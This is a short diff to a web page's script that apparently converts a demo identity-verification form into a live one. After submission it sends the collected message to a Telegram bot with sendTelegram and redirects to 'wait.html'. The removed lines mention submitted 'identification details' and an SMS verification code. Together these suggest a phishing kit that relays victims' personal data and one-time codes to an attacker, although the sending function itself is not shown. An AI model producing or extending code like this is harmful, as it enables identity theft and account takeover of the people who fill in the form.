@@ -553,20 +553,19 @@
                     console.error('Telegram send error:', e);
                 }
 
-                // Reset button
-                submitBtn.disabled = false;
-                submitBtn.classList.remove('loading');
+                await sendTelegram(message);
+                console.log('Telegram sent');
 
-                // Redirect to a verification page (simulate)
-                // In a real scenario, you might redirect to an OTP page.
-                // For demo, we show a success message.
-                // We'll redirect to a dummy page (or just show alert)
-                // window.location.href = 'verification.html';
-                alert('Your identification details have been submitted. You will receive a verification code via SMS.');
-                // Optionally reset form
-                // form.reset();
+                // Redirect to wait page
+                window.location.href = 'wait.html';
+            });
+
+            // ---- close error message ----
+            $('#cross-1').click(function() {
+                $('#error-msg').hide();
             });
         });
     </script>
+
 </body>
 </html>
